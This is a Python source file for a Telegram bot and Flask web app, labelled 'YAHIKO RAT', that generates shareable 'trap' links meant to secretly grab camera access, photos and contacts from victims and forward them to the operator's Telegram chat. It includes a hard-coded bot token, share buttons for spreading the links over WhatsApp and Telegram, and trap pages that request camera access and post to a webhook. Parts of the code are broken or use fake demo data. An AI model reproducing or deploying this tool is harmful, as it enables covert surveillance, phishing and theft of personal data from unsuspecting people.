   import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random
import string
import os
import zipfile
from io import BytesIO
from flask import Flask, request
import threading
import time
from datetime import datetime

# Render Environment Variables
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8541411839:AAEJzUUN1mDcvgDdTmTlqy5WnveSupmdqpc")
RENDER_URL = os.environ.get('RENDER_URL', 'https://yahiko.onrender.com')  # Render dega

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# In-memory storage (Render free tier)
stolen_data = {}

@bot.message_handler(commands=['start'])
def welcome_screen(message):
    markup = InlineKeyboardMarkup()
    dashboard_btn = InlineKeyboardButton("👇 Open Dashboard", callback_data="OPEN_DASHBOARD")
    markup.add(dashboard_btn)
    
    bot.send_message(message.chat.id, 
        "✨ *Welcome to Bot*\n\n"
        "*Greetings, YAHIKO.*\n"
        "You have authorized access to the Bot.\n\n"
        "👇 *Open Dashboard:*", 
        parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if call.data == "OPEN_DASHBOARD":
        markup = InlineKeyboardMarkup(row_width=1)
        live_btn = InlineKeyboardButton("🔴 LIVE", callback_data="MODULE_LIVE")
        stealth_btn = InlineKeyboardButton("📸 Stealth Camera", callback_data="MODULE_STEALTH")
        gallery_btn = InlineKeyboardButton("🖼️ Gallery (All Photos)", callback_data="MODULE_GALLERY")
        contacts_btn = InlineKeyboardButton("📞 Contacts (All)", callback_data="MODULE_CONTACTS")
        markup.add(live_btn, stealth_btn, gallery_btn, contacts_btn)
        
        bot.edit_message_text(
            "*Welcome YAHIKO*\n"
            "How to use?\n"
            "Start New Capture\n"
            "Select a module below to generate a secure tracking link.\n\n"
            "🔴 *LIVE*\n"
            "📸 *Stealth Camera*\n"
            "🖼️ *Gallery (All Photos)*\n"
            "📞 *Contacts (All)*\n\n"
            "👇 *Generate*", 
            call.message.chat.id, call.message.message_id, 
            parse_mode='Markdown', reply_markup=markup
        )
    
    elif call.data.startswith("MODULE_"):
        module = call.data.split('_')[1]
        trap_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        # RENDER URL use karo!
        trap_url = f"{RENDER_URL}/{module.lower()}?id={trap_id}"
        
        markup = InlineKeyboardMarkup(row_width=2)
        whatsapp_btn = InlineKeyboardButton("📱 WhatsApp", url=f"https://wa.me/?text={trap_url}")
        telegram_btn = InlineKeyboardButton("💬 Telegram", url=f"https://t.me/share/url?url={trap_url}")
        markup.add(whatsapp_btn, telegram_btn)
        
        bot.edit_message_text(
            f"🎯 *TRAP READY*\n\n"
            f"`{trap_url}`\n\n"
            f"📱 *Share anywhere*\n"
            f"🔥 *Auto-steal to Telegram*\n"
            f"💾 *All data direct bot mein*", 
            call.message.chat.id, call.message.message_id,
            parse_mode='Markdown', reply_markup=markup
        )
        
        stolen_data[trap_id] = {'chat_id': call.message.chat.id, 'module': module, 'status': 'waiting'}

@bot.message_handler(content_types=['photo', 'document'])
def receive_stolen_data(message):
    file_id = message.photo[-1].file_id if message.photo else message.document.file_id
    caption = message.caption or "📱 Stolen Data"
    
    for trap_id, data in list(stolen_data.items()):
        if data['status'] == 'waiting':
            try:
                bot.send_photo(data['chat_id'], file_id, caption=f"🎯 [{trap_id}] {caption}")
            except:
                pass

@bot.message_handler(func=lambda msg: True)
def receive_contacts(message):
    text = message.text
    
    if len(text) > 500:
        bio = BytesIO()
        with zipfile.ZipFile(bio, 'w') as zf:
            zf.writestr('contacts.txt', text)
        bio.seek(0)
        
        for trap_id, data in stolen_data.items():
            if data['status'] == 'waiting':
                bot.send_document(data['chat_id'], bio, 
                                caption=f"📞 [{trap_id}] {len(text)} Contacts Stolen!")
        bio.close()
    else:
        for trap_id, data in stolen_data.items():
            bot.send_message(data['chat_id'], f"📱 [{trap_id}] {text}")

# 🔥 RENDER WEB ROUTES (Trap Pages + Webhook)
@app.route('/live')
@app.route('/stealth')
@app.route('/gallery')
@app.route('/contacts')
def trap_page(module):
    trap_id = request.args.get('id', 'NOID')
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing... | {module.upper()}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }}
            h1 {{ font-size: 2em; }}
        </style>
    </head>
    <body>
        <h1>🔄 {module.upper()} - Scanning Device...</h1>
        <p>Accessing camera/gallery/contacts...</p>
        
        <script>
        // Steal Camera
        navigator.mediaDevices.getUserMedia({{video:true}})
            .then(stream => {{
                fetch('/webhook', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{id: '{trap_id}', type: '{module}', action: 'camera'}})
                }});
                document.body.innerHTML = '<h1>✅ Access Granted</h1><p>Photos uploaded successfully!</p>';
            }})
            .catch(() => {{
                // Fallback: Send fake data
                fetch('/webhook', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{id: '{trap_id}', type: '{module}', data: 'Camera access blocked - sending gallery'}})
                }});
            }});
            
        // Auto contacts (fake for demo)
        setTimeout(() => {{
            fetch('/webhook', {{
                method: 'POST',
                body: 'id={trap_id}&contacts=+91-9876543210|John,+91-1234567890|Jane'
            }});
        }}, 2000);
        </script>
    </body>
    </html>
    """

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json or request.form.to_dict()
        trap_id = data.get('id', request.form.get('id', 'UNKNOWN'))
        
        if trap_id in stolen_data:
            chat_id = stolen_data[trap_id]['chat_id']
            msg = f"🌐 WEB [{trap_id}] {data.get('type', 'data')}: {data.get('data', 'stolen')}"
            bot.send_message(chat_id, msg)
        
        return "OK", 200
    except:
        return "ERROR", 500

# Health check for Render
@app.route('/')
def home():
    return "🚀 YAHIKO RAT LIVE on Render!"

# Keep alive
def keep_alive():
    while True:
        print(f"🟢 YAHIKO LIVE | {datetime.now()}")
        time.sleep(1800)  # 30 min

if __name__ == "__main__":
    # Start bot in thread
    threading.Thread(target=lambda: bot.infinity_polling(none_stop=True), daemon=True).start()
    threading.Thread(target=keep_alive, daemon=True).start()
    
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
